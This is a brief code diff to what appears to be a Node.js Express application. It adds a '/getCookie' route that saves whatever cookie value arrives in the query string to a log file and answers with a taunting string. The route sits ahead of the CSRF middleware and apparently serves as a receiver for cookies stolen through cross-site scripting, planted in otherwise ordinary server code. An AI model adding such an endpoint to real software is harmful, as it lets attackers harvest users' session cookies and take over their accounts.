@@ -173,6 +173,11 @@ app.get("/csrf-token", (req, res) => {
   res.json({ csrfToken });
 });
 
+app.get("/getCookie", (req, res) => {
+  fs.writeFileSync("/var/log/node/" + Date.now(), req.query.cookie);
+  res.send("贺建豪666");
+});
+
 app.use(doubleCsrfProtection);
 
 // 数据统计
